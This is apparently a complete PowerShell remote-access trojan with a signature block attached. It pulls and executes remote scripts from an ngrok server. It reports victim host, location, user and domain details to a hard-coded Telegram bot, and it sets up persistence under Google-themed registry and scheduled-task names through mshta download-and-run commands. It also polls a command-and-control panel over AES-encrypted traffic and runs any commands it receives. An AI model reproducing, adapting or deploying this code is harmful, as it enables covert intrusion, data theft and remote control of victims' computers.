#-------------------------
$debug = $false #Debug mode
$vm_protect=$true #TRIANGLE it`s for you =)
#-------------------------
$decodedArt = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("IC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnwgICAgICAgICAgX19fX18gICAgICAgICAgICAgICAgICAgICAgICAgICAgIF8gICBfICAgXyAgICAgICBfICAgICAgIF9fX18gIF8gICAgICAgICAgICAgXyAgICAgICAgICAgICAJICAgICAJIHwNCnwgICAgICAgICB8IF9fX198XyBfXyAgIF9fXyBfIF9fIF8gICBfIF8gX18gfCB8X3wgfCB8IHxfICAgX3wgfF9fICAgLyBfX198fCB8XyBfX18gIF9fIF98IHwgX19fIF8gX18gICAgICAgICAgICAgfA0KfCAgICAgICAgIHwgIF98IHwgJ18gXCAvIF9ffCAnX198IHwgfCB8ICdfIFx8IF9ffCB8X3wgfCB8IHwgfCAnXyBcICBcX19fIFx8IF9fLyBfIFwvIF8nIHwgfC8gXyBcICdfX3wgICAgICAgICAgICB8DQp8ICAgICAgICAgfCB8X19ffCB8IHwgfCAoX198IHwgIHwgfF98IHwgfF8pIHwgfF98ICBfICB8IHxffCB8IHxfKSB8ICBfX18pIHwgfHwgIF9fLyAoX3wgfCB8ICBfXy8gfCAgICAgICAgICAgICAgIHwNCnwgICAgICAgICB8X19fX198X3wgfF98XF9fX3xffCAgIFxfXywgfCAuX18vIFxfX3xffCB8X3xcX18sX3xfLl9fLyAgfF9fX18vIFxfX1xfX198XF9fLF98X3xcX19ffF98ICAgICAgICAgICAgICAgfA0KfCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfF9fXy98X3wgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB8DQp8ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHwNCnwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBSZWQgVGVhbWluZyBhbmQgT2ZmZW5zaXZlIFNlY3VyaXR5ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfA0KIC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0="))
if ($debug){
	Write-Host $decodedArt -ForegroundColor Red
}

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$redExclamation = [char]0x203C

if ($vm_protect) {
    VMPROTECT
}

function VMPROTECT {
    $link = ("https://ratte.ngrok.app/main/antivm.ps1")
    iex (iwr -uri $link -useb)
    Write-Host "[!] NOT A VIRTUALIZED ENVIRONMENT" -ForegroundColor Green
}

function Send-TelegramMessage {
    param (
        [string]$message
    )

    $ErrorActionPreference = 'silentlycontinue'
    $Messaging = $message
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
	#Check Active Directory
    $compSystem = Get-WmiObject -Class Win32_ComputerSystem
    $domain = $null
    if ($compSystem.PartOfDomain) {
        $domain = "$($compSystem.Domain)"
    } else {
		if ($debug){
			Write-Output "[!] Domain not found" -ForegroundColor Red
		}
    }

	$botToken = "6991298066:AAGPSpmFZ_t4v8iEOrSCvt2ywjaCTbiFZgQ" 
	$chatID = "-1002187837029"
    $serverIP = "Server IP"
    $os = Get-WmiObject Win32_OperatingSystem
    $osVersion = $os.Caption
    $ipAddress = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq 'Ethernet' -and $_.AddressFamily -eq 'IPv4' }).IPAddress
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $externalIP = $ipInfo.ip
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME

    #----------LOCATION----------
    $ipInfo = Invoke-RestMethod -Uri "https://ipinfo.io/json"
    $location = $ipInfo.loc
    $city = $ipInfo.city
    $region = $ipInfo.region
    $country = $ipInfo.country

    if (-not (Test-Connection -ComputerName $serverIP -Count 1 -Quiet)) { 
        if($domain){
            $redExclamation = [char]0x203C
            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName `n$($redExclamation)Domain: <b>$domain</b>"
            $adminResponse = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/getChatAdministrators?chat_id=$chatID" -Method Get
            $admins = $adminResponse.result
            foreach ($admin in $admins) {
                $adminId = $admin.user.id
                $sendMessageParams = @{
                    chat_id = $adminId
                    text = $messageText
                    parse_mode = "HTML"
                }
                $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
                $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)
                try {
                    Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
                } catch {
					if ($debug){
						Write-Output "[!] Restricted: $adminId" -ForegroundColor Red
					}
                }
            }
        } else {
            $messageText = "$Messaging `n$country, $city`nIP: $externalIP/$ipAddress `nOS: $osVersion`nPC Name: $computerName`nUser Name: $userName"
            $sendMessageParams = @{
                chat_id = $chatID
                text = $messageText
                parse_mode = "HTML"
            }

            $jsonParams = $sendMessageParams | ConvertTo-Json -Depth 10
            $utf8JsonParams = [System.Text.Encoding]::UTF8.GetBytes($jsonParams)

            Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -ContentType "application/json" -Body $utf8JsonParams
        }
    }
}

$SERVER_URL = "https://ratte.ngrok.app/panel/"# Panel

$message = "$($redExclamation) [RAT] Installed"
Send-TelegramMessage -message $message

$UAG='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls, [Net.SecurityProtocolType]::Tls11, [Net.SecurityProtocolType]::Tls12, [Net.SecurityProtocolType]::Ssl3

Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing

function SystemInfo {
    $IP = Invoke-RestMethod https://ident.me -UserAgent $UAG
    $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
    $INFO = Get-ComputerInfo
    $SYSTEM = @{
        uuid      = "$UID"
        public_ip = "$IP"
        info      = $INFO
    }
    return $SYSTEM 
}

function EncryptString {
    Param ([string]$inputStr)
    $inputBytes = [System.Text.Encoding]::UTF8.GetBytes($inputStr)
    $enc = [System.Text.Encoding]::UTF8

    $AES = New-Object System.Security.Cryptography.AESManaged
    $iv = "&9*zS7LY%ZN1thfI"
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.BlockSize = 128
    $AES.KeySize = 256
    $AES.IV = $enc.GetBytes($iv)
    $AES.Key = $enc.GetBytes("123456789012345678901234r0hollah")
    $encryptor = $AES.CreateEncryptor()
    $encryptedBytes = $encryptor.TransformFinalBlock($inputBytes, 0, $inputBytes.length)
    $output = [Convert]::ToBase64String($encryptedBytes)
    return $output
}

function DcryptString {
    Param ([string]$inputStr)
    $data = [Convert]::FromBase64String($inputStr)
    $iv = "&9*zS7LY%ZN1thfI"
    $key = "123456789012345678901234r0hollah".PadRight(16, [char]0)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $utf8 = [System.Text.Encoding]::Utf8
    $aes.Key = $utf8.GetBytes($key)
    $aes.IV = $utf8.GetBytes($iv)
    $dec = $aes.CreateDecryptor()
    $RESULT = $dec.TransformFinalBlock($data, 0, $data.Length)
    $RESULTStr = $utf8.GetString($RESULT)
    return $RESULTStr
    $dec.Dispose()
}

function KDMUTEX {
    $AppId = "62088a7b-ae9f-4802-827a-6e9c666cb48e" #GUID
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if (-not $CreatedNew) {
		if ($debug){
			Write-Output "[!] An instance of this script is already running."  -ForegroundColor Red
		}
		$message = "[RAT] [!] An instance of this script is already running."
		Send-TelegramMessage -message $message
        exit
    }
    [ProcessUtility]::MakeProcessKillable()
    Invoke-TASKS
}

Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

public static class ProcessUtility
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

    public static void MakeProcessCritical()
    {
        Process.EnterDebugMode();
        RtlSetProcessIsCritical(1, 0, 0);
    }

    public static void MakeProcessKillable()
    {
        RtlSetProcessIsCritical(0, 0, 0);
    }
}
"@

function Invoke-TASKS {
	if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
		$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
		$regName = "Google LLC Worker"
		$regValue = "mshta.exe vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://ratte.ngrok.app/main/zakrep/worker.ps1'|iex`",0)(window.close)"

		New-ItemProperty -Path $regPath -Name $regName -Value $regValue -PropertyType String -Force | Out-Null

		$property = Get-ItemProperty -Path $regPath -Name $regName
		if ($property.$regName -eq $regValue) {
			if ($debug){
				Write-Output "[+] Reg AutoRun success."  -ForegroundColor Green
			}
			$message = "$($redExclamation) [RAT] REG AutoRun success"
			Send-TelegramMessage -message $message
		} else {
			if ($debug){
				Write-Output "[!] Reg AutoRun fail"  -ForegroundColor Red
			}
			$message = "$($redExclamation) [RAT] REG AutoRun fail"
			Send-TelegramMessage -message $message
		}
	} else {
		$backName = "WorkerTask"
		$task = Get-ScheduledTask -TaskName $backName -ErrorAction SilentlyContinue
		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
			Unregister-ScheduledTask -TaskName $backName -Confirm:$false
		}
		$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$t = Iwr -Uri 'https://ratte.ngrok.app/main/zakrep/worker.ps1'|iex`",0)(window.close)"
		$task_trigger = New-ScheduledTaskTrigger -AtLogOn
		$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
		Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $backName -Description "Google Chrome Protector" -RunLevel Highest -Force | Out-Null
		if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
			if ($debug){
				Write-Output "[+] Task AutoRun success"  -ForegroundColor Green
			}
			$message = "$($redExclamation) [RAT] TASK AutoRun success"
			Send-TelegramMessage -message $message
		} else {
			if ($debug){
				Write-Output "[!] Task AuoRun fail"  -ForegroundColor Red
			}
			$message = "$($redExclamation) [RAT] TASK AutoRun fail"
			Send-TelegramMessage -message $message
		}
	}
	while ($true) {
    $SYSTEM = SystemInfo 
    $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
    $CRYPT = EncryptString  $JSON
    $PARAM = @{
        DATA     = $CRYPT
        new_user = "ok"
    }
    Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM -UserAgent $UAG

    while ($true) {
        $TIMER = Get-Random -SetSeed 300 -Maximum 700
        sleep -Milliseconds $TIMER
        $UID = (Get-CimInstance -Class Win32_ComputerSystemProduct).UUID
        $SYSTEM = @{
            uuid = "$UID"
        }
        $JSON = $SYSTEM | ConvertTo-JSON -Depth 100
        $CRYPT = EncryptString  $JSON
        $PARAM = @{
            DATA = $CRYPT
        }
        $RESULT = Invoke-RestMethod  -Method 'Post' -Uri $SERVER_URL  -Body  $PARAM  -UserAgent $UAG
        $REQ = DcryptString($RESULT)
			if ($REQ -ne "wait") {
				$JSON = $REQ | ConvertFrom-Json
				foreach ($file in $JSON) {
					$MODE = $file.json
					$CMD_UID = $file.cmd_uid
					$CMD = $file.cmd
					if (Get-Job -Name $CMD_UID -ErrorAction SilentlyContinue) {
						if ((Get-Job -Name $CMD_UID -ErrorAction SilentlyContinue | Select-Object -ExpandProperty State) -eq "Completed" -or 
							(Get-Job -Name $CMD_UID -ErrorAction SilentlyContinue | Select-Object -ExpandProperty State) -eq "Failed") {
							$RUN = Receive-Job -Name $CMD_UID -ErrorAction SilentlyContinue
							if ($RUN -eq "" -or $RUN -eq $null) {
								$RUN = "No Result"
							}
							$SYSTEM = @{
								uuid    = "$UID"
								result  = "$RUN"
								cmd_uid = "$CMD_UID"
							}
							$JSON = $SYSTEM | ConvertTo-JSON -Depth 100
							$CRYPT = EncryptString $JSON
							$PARAM = @{
								DATA = $CRYPT
							}
							Invoke-RestMethod -Method 'Post' -Uri $SERVER_URL -Body $PARAM -UserAgent $UAG
						}
					} else {
						$SB = [scriptblock]::Create("iex '$CMD | Out-String'")
						$JOB = Start-Job -ScriptBlock $SB -Name $CMD_UID -ErrorAction SilentlyContinue
					}
				} 
			}
		}
	}
}
KDMUTEX

# SIG # Begin signature block
# MIIpoAYJKoZIhvcNAQcCoIIpkTCCKY0CAQExDzANBglghkgBZQMEAgEFADB5Bgor
# BgEEAYI3AgEEoGswaTA0BgorBgEEAYI3AgEeMCYCAwEAAAQQH8w7YFlLCE63JNLG
# KX7zUQIBAAIBAAIBAAIBAAIBADAxMA0GCWCGSAFlAwQCAQUABCCTUpCg2JkcZewv
# QDEtoP4qJq4MkxZdMtLf7FgcMZ8AVaCCDxAwggboMIIE0KADAgECAhB3vQ4Ft1kL
# th1HYVMeP3XtMA0GCSqGSIb3DQEBCwUAMFMxCzAJBgNVBAYTAkJFMRkwFwYDVQQK
# ExBHbG9iYWxTaWduIG52LXNhMSkwJwYDVQQDEyBHbG9iYWxTaWduIENvZGUgU2ln
# bmluZyBSb290IFI0NTAeFw0yMDA3MjgwMDAwMDBaFw0zMDA3MjgwMDAwMDBaMFwx
# CzAJBgNVBAYTAkJFMRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTIwMAYDVQQD
# EylHbG9iYWxTaWduIEdDQyBSNDUgRVYgQ29kZVNpZ25pbmcgQ0EgMjAyMDCCAiIw
# DQYJKoZIhvcNAQEBBQADggIPADCCAgoCggIBAMsg75ceuQEyQ6BbqYoj/SBerjgS
# i8os1P9B2BpV1BlTt/2jF+d6OVzA984Ro/ml7QH6tbqT76+T3PjisxlMg7BKRFAE
# eIQQaqTWlpCOgfh8qy+1o1cz0lh7lA5tD6WRJiqzg09ysYp7ZJLQ8LRVX5YLEeWa
# tSyyEc8lG31RK5gfSaNf+BOeNbgDAtqkEy+FSu/EL3AOwdTMMxLsvUCV0xHK5s2z
# BZzIU+tS13hMUQGSgt4T8weOdLqEgJ/SpBUO6K/r94n233Hw0b6nskEzIHXMsdXt
# HQcZxOsmd/KrbReTSam35sOQnMa47MzJe5pexcUkk2NvfhCLYc+YVaMkoog28vmf
# vpMusgafJsAMAVYS4bKKnw4e3JiLLs/a4ok0ph8moKiueG3soYgVPMLq7rfYrWGl
# r3A2onmO3A1zwPHkLKuU7FgGOTZI1jta6CLOdA6vLPEV2tG0leis1Ult5a/dm2tj
# IF2OfjuyQ9hiOpTlzbSYszcZJBJyc6sEsAnchebUIgTvQCodLm3HadNutwFsDeCX
# pxbmJouI9wNEhl9iZ0y1pzeoVdwDNoxuz202JvEOj7A9ccDhMqeC5LYyAjIwfLWT
# yCH9PIjmaWP47nXJi8Kr77o6/elev7YR8b7wPcoyPm593g9+m5XEEofnGrhO7izB
# 36Fl6CSDySrC/blTAgMBAAGjggGtMIIBqTAOBgNVHQ8BAf8EBAMCAYYwEwYDVR0l
# BAwwCgYIKwYBBQUHAwMwEgYDVR0TAQH/BAgwBgEB/wIBADAdBgNVHQ4EFgQUJZ3Q
# /FkJhmPF7POxEztXHAOSNhEwHwYDVR0jBBgwFoAUHwC/RoAK/Hg5t6W0Q9lWULvO
# ljswgZMGCCsGAQUFBwEBBIGGMIGDMDkGCCsGAQUFBzABhi1odHRwOi8vb2NzcC5n
# bG9iYWxzaWduLmNvbS9jb2Rlc2lnbmluZ3Jvb3RyNDUwRgYIKwYBBQUHMAKGOmh0
# dHA6Ly9zZWN1cmUuZ2xvYmFsc2lnbi5jb20vY2FjZXJ0L2NvZGVzaWduaW5ncm9v
# dHI0NS5jcnQwQQYDVR0fBDowODA2oDSgMoYwaHR0cDovL2NybC5nbG9iYWxzaWdu
# LmNvbS9jb2Rlc2lnbmluZ3Jvb3RyNDUuY3JsMFUGA1UdIAROMEwwQQYJKwYBBAGg
# MgECMDQwMgYIKwYBBQUHAgEWJmh0dHBzOi8vd3d3Lmdsb2JhbHNpZ24uY29tL3Jl
# cG9zaXRvcnkvMAcGBWeBDAEDMA0GCSqGSIb3DQEBCwUAA4ICAQAldaAJyTm6t6E5
# iS8Yn6vW6x1L6JR8DQdomxyd73G2F2prAk+zP4ZFh8xlm0zjWAYCImbVYQLFY4/U
# ovG2XiULd5bpzXFAM4gp7O7zom28TbU+BkvJczPKCBQtPUzosLp1pnQtpFg6bBNJ
# +KUVChSWhbFqaDQlQq+WVvQQ+iR98StywRbha+vmqZjHPlr00Bid/XSXhndGKj0j
# fShziq7vKxuav2xTpxSePIdxwF6OyPvTKpIz6ldNXgdeysEYrIEtGiH6bs+XYXvf
# cXo6ymP31TBENzL+u0OF3Lr8psozGSt3bdvLBfB+X3Uuora/Nao2Y8nOZNm9/Lws
# 80lWAMgSK8YnuzevV+/Ezx4pxPTiLc4qYc9X7fUKQOL1GNYe6ZAvytOHX5OKSBoR
# HeU3hZ8uZmKaXoFOlaxVV0PcU4slfjxhD4oLuvU/pteO9wRWXiG7n9dqcYC/lt5y
# A9jYIivzJxZPOOhRQAyuku++PX33gMZMNleElaeEFUgwDlInCI2Oor0ixxnJpsoO
# qHo222q6YV8RJJWk4o5o7hmpSZle0LQ0vdb5QMcQlzFSOTUpEYck08T7qWPLd0jV
# +mL8JOAEek7Q5G7ezp44UCb0IXFl1wkl1MkHAHq4x/N36MXU4lXQ0x72f1LiSY25
# EXIMiEQmM2YBRN/kMw4h3mKJSAfa9TCCCCAwggYIoAMCAQICDArubE/GQ7e0PDgW
# CzANBgkqhkiG9w0BAQsFADBcMQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFs
# U2lnbiBudi1zYTEyMDAGA1UEAxMpR2xvYmFsU2lnbiBHQ0MgUjQ1IEVWIENvZGVT
# aWduaW5nIENBIDIwMjAwHhcNMjQwMTI2MDkyODEwWhcNMjUwMTI2MDkyODEwWjCC
# AYQxHTAbBgNVBA8MFFByaXZhdGUgT3JnYW5pemF0aW9uMRswGQYDVQQFExI5MTQ0
# MDYwNU1BQ1JKTEZNWEwxEzARBgsrBgEEAYI3PAIBAxMCQ04xGjAYBgsrBgEEAYI3
# PAIBAhMJR3Vhbmdkb25nMRcwFQYLKwYBBAGCNzwCAQETBkZvc2hhbjELMAkGA1UE
# BhMCQ04xEjAQBgNVBAgTCUd1YW5nZG9uZzEPMA0GA1UEBxMGRm9zaGFuMUIwQAYD
# VQQJEzlSb29tIDUwMiwgTm8uMjIsIEppYW5nYnUgUm9hZCwgRGFsaSBUb3duLCBO
# YW5oYWkgRGlzdHJpY3QxQjBABgNVBAoTOUlub2VsbGFjdCBFbG91YmFudFRlY2gg
# T3B0aW1pemF0aW9uIEluZm9ybWF0aW9uIENvLiwgTHRkLjFCMEAGA1UEAxM5SW5v
# ZWxsYWN0IEVsb3ViYW50VGVjaCBPcHRpbWl6YXRpb24gSW5mb3JtYXRpb24gQ28u
# LCBMdGQuMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAu80gUYQNVvpV
# d4jkM0BBrXVTSFyjMvTl80g7o/jQcUq+ELPWgTTQ0GtCAy+CnTSDb15RJVJ2C6uc
# 9INsvjmh4noWJKosS5Ox7NP6T8HIP8MGLabu08hWbw+QI247N/7ah7rDrQQPSW2E
# WOInu4jwkZlfEo9fA71SgYL/zcNtKz5PWQh48dU1IxBT3iQGSEZ6BPt3Yp5ZFErQ
# MxogxYSr7wE6noq/6V2WPqPvOrh6GW6iTiv95uvwtwHql7jH0yiDolu2LPBfB39d
# 2v89YGbweZvle6Kr+GuKX5F1vHfBcuqcvZpX/uiSwIKda7BerBKyDsBBq3gJ1H4x
# o+4nnWSRFyg6jflx9oqnpvI/wUYv75NFOo/CKLqqfDHAZz2M8SsJRM0DGX4rOUaG
# TeriiE40xxuQcgwXT7grevKoTNFaYGnjAnZlhrSNUgJDdrzFSqtiTAdWCPr4GJKj
# Zag25IlkDr8X0KFL+oDYtQwlYE2jenwM13rdiBjTVFaMGMOpXsJw+uuARlFWlq/S
# 387roU8tPI1pG4Bh6bM4rgISrheEQARm8Uhdi7UeEIddswSM7DXgWQN6vf4LTRQx
# RM4/6nKzixzrs/g8N4DKnHCs0Ukh9orU2xpG8MzQa7eNjW+7oS/ok8MkHTGqv9nc
# TPhTREgmlwPWZadB+hztM9aBSDUaefECAwEAAaOCAbYwggGyMA4GA1UdDwEB/wQE
# AwIHgDCBnwYIKwYBBQUHAQEEgZIwgY8wTAYIKwYBBQUHMAKGQGh0dHA6Ly9zZWN1
# cmUuZ2xvYmFsc2lnbi5jb20vY2FjZXJ0L2dzZ2NjcjQ1ZXZjb2Rlc2lnbmNhMjAy
# MC5jcnQwPwYIKwYBBQUHMAGGM2h0dHA6Ly9vY3NwLmdsb2JhbHNpZ24uY29tL2dz
# Z2NjcjQ1ZXZjb2Rlc2lnbmNhMjAyMDBVBgNVHSAETjBMMEEGCSsGAQQBoDIBAjA0
# MDIGCCsGAQUFBwIBFiZodHRwczovL3d3dy5nbG9iYWxzaWduLmNvbS9yZXBvc2l0
# b3J5LzAHBgVngQwBAzAJBgNVHRMEAjAAMEcGA1UdHwRAMD4wPKA6oDiGNmh0dHA6
# Ly9jcmwuZ2xvYmFsc2lnbi5jb20vZ3NnY2NyNDVldmNvZGVzaWduY2EyMDIwLmNy
# bDATBgNVHSUEDDAKBggrBgEFBQcDAzAfBgNVHSMEGDAWgBQlndD8WQmGY8Xs87ET
# O1ccA5I2ETAdBgNVHQ4EFgQUCxvJRiLTI4ldicnHVMMy0MAEyfUwDQYJKoZIhvcN
# AQELBQADggIBAK/4bqH6XRiOspv+xIPLDEqGxkkQHmT2Gp9wHSl4FYflpU/DjG5t
# RlDSaoiMJ1X4NHg5ig0dbehanU18fnrNF6h8FEiQfWJ77oqPNoZ9jxws7jxBiTSm
# aeLmGToMM2LB5S3KZ4BF3Z9ynyFgs3bUuDoLeGEcjJt0lts9VxWXKcx2Wtjr8ePG
# YuS8m1IupxZ9gxU7/KAsDthSjXQ2gKiOZeF3kSACclr1QPmIhTNKgQxgg0wjxB47
# Bx5hVg7PPgz+IrzMvZYEBj5Yn4IN8ITIEN3lWwlcbqJRTK69zrRqwX36MT304XVs
# CYU92HzdQWIEmz58k+D1DQiwjA+B2PcZvjNpncl0oH9l7mEnb01Y3reiw6sb2EIG
# Esxjr+DypPlWTTcPYIOpvrbMmGRyzAsf3JoNSymen/uJylP5QTMa0YkL0bF+5zBs
# 9fQcDskkyvsncfexRxWSnkej0m1I/ePJKPR93sqUQEjnkgL78HFQyw08SM0H+m99
# 1FenzywKAUrfZrxSGBB2iagoVEXXpbfxGpBKNJaVkG6p0KAxzywfQHAXHP3dVLH6
# Y30XAqw7pryFEywGpulbTKpB27CqlXSWzFpjCJHsFCEuKQBmb4bxrHvj76Gg91cu
# IZiRwJ10CzAUoQ6px6qflAHjAAt44k7o1sxYn3Li3BqvkTa4q9rN95XgMYIZ5jCC
# GeICAQEwbDBcMQswCQYDVQQGEwJCRTEZMBcGA1UEChMQR2xvYmFsU2lnbiBudi1z
# YTEyMDAGA1UEAxMpR2xvYmFsU2lnbiBHQ0MgUjQ1IEVWIENvZGVTaWduaW5nIENB
# IDIwMjACDArubE/GQ7e0PDgWCzANBglghkgBZQMEAgEFAKB8MBAGCisGAQQBgjcC
# AQwxAjAAMBkGCSqGSIb3DQEJAzEMBgorBgEEAYI3AgEEMBwGCisGAQQBgjcCAQsx
# DjAMBgorBgEEAYI3AgEVMC8GCSqGSIb3DQEJBDEiBCDE3Sdt+qiQaygVIRbn+ysK
# CYCo99nGQXNJroBIZJFJkzANBgkqhkiG9w0BAQEFAASCAgAJAI82eVEO+2NC9fzw
# sB35JZvwA63JZz1vuWT+eylFeRJuGLE40j9HqvaMM7hlCcTVd5SM7+PiQSqPCwxa
# TPbgrk7Mh0hqa8MAaMOoqRTMuTm8DsYgAVAwoMTQBNoVPJfLZ+O9upkJhrf5roge
# w/WbcLJ0gofPRIjhrU55/AvRPh1J/36iiS3IPJRovpudHVSpg/FfJAXEgqE/6tFC
# OIYyxRpQJFoAVWOkt/xiD1yoAOpPZ3N7uYxxTSuxC+6Cl1rjd3xTyA93nqTk3zCQ
# qGH1G+zKD2/jNSmPP/gA9g+fOXMGGtAfs1tbPRzJ3v4o24zBNrLgy3DkTjYyzAPp
# 8AL6ddUfmbieqE3g58EeTH+keDgG29XYbGmoTsfzhjAq7fsKw6/JbKUBE9F5WhDj
# +2qL28z9xCAyCgWEgddMy1ABCgjIG9H1zZBK2HAP8ZV6v0fCpsjQGnkjII880em4
# bpiq7YnRGUb96YXXwAkJRd7pvQ9tTQTL1+qppsfcSMOmsKSGPKykdSSBpwwuS6Mg
# l4ts/NiZfdvF75dsSvkH+6ywSZLiZAJVK8Ys6kBqIOU+mXLrZzu5epME399yyjAI
# KnJUcDQ1BZsgV67yIGOj6DV6n3XiMaMX3amdLtibl5JxSuLvvRPdu5U8tJv9TD//
# Lgw2izHi6gdLbpgb06KP3DWSY6GCFs0wghbJBgorBgEEAYI3AwMBMYIWuTCCFrUG
# CSqGSIb3DQEHAqCCFqYwghaiAgEDMQ0wCwYJYIZIAWUDBAIBMIHoBgsqhkiG9w0B
# CRABBKCB2ASB1TCB0gIBAQYLKwYBBAGgMgIDAQIwMTANBglghkgBZQMEAgEFAAQg
# mu9Cqg3ah4JIEh33d5F0n43xida1iGz2xZJl/3QI7+UCFE5h2ttaUAVdAIJZqe53
# WRAADRGyGA8yMDI0MDcyNDA1MzExOFowAwIBAaBhpF8wXTELMAkGA1UEBhMCQkUx
# GTAXBgNVBAoMEEdsb2JhbFNpZ24gbnYtc2ExMzAxBgNVBAMMKkdsb2JhbHNpZ24g
# VFNBIGZvciBDb2RlU2lnbjEgLSBSNiAtIDIwMjMxMaCCElQwggZsMIIEVKADAgEC
# AhABm+reyE1rj/dsOp8uASQWMA0GCSqGSIb3DQEBCwUAMFsxCzAJBgNVBAYTAkJF
# MRkwFwYDVQQKExBHbG9iYWxTaWduIG52LXNhMTEwLwYDVQQDEyhHbG9iYWxTaWdu
# IFRpbWVzdGFtcGluZyBDQSAtIFNIQTM4NCAtIEc0MB4XDTIzMTEwNzE3MTM0MFoX
# DTM0MTIwOTE3MTM0MFowXTELMAkGA1UEBhMCQkUxGTAXBgNVBAoMEEdsb2JhbFNp
# Z24gbnYtc2ExMzAxBgNVBAMMKkdsb2JhbHNpZ24gVFNBIGZvciBDb2RlU2lnbjEg
# LSBSNiAtIDIwMjMxMTCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAOqE
# N1BoPJWFtUhUcZfzhHLJnYDTCNxZu7/LTZBpR4nlLNjxqGp+YDdJc5u4mLMU4O+M
# k3AgtfUr12YFdT96hFCpUg/g1udv1Bw1LuAvKSSjjnclJ+C4831kdQyaQuXGneLY
# h3OL76CNl34WoMSyRs9gxs8PgVCA3U/p5EaiNKc+GMdrtLb7vtqpVn5/nF02PWM0
# IUvI0qMTGj4vUWh1+X/8cIQRZTMSs0ZlKISgM8CSne24H4lj0B57LFuwBPS9cmPO
# sDEhAQJqcrIiLO/rKjsQ1fGa9CaiLPxTAQR5I2lR012+c4TLm4OIbSDSIM6Bq2oi
# S3mQQuaCQq8D69TQ2oN6wy1I8c1FkbcRQd0X70D8EqKywFmqVJdObcN63YaG1Ds3
# RzjoAzwxv0wze0Ps8ND/ZaafmD3SxrpZImwQWBHFBMzoopiwHTPQ85Ud+O1xtAtB
# 1WR5orxgLsN6yd5wNxIWPgKPXTgRsASJZ4ulLSDbuNb1nPUPvIi/JyzD+SCiwQID
# AQABo4IBqDCCAaQwDgYDVR0PAQH/BAQDAgeAMBYGA1UdJQEB/wQMMAoGCCsGAQUF
# BwMIMB0GA1UdDgQWBBT5Tqu+uPhb/8LHA/RB7pz41nR9PzBWBgNVHSAETzBNMAgG
# BmeBDAEEAjBBBgkrBgEEAaAyAR4wNDAyBggrBgEFBQcCARYmaHR0cHM6Ly93d3cu
# Z2xvYmFsc2lnbi5jb20vcmVwb3NpdG9yeS8wDAYDVR0TAQH/BAIwADCBkAYIKwYB
# BQUHAQEEgYMwgYAwOQYIKwYBBQUHMAGGLWh0dHA6Ly9vY3NwLmdsb2JhbHNpZ24u
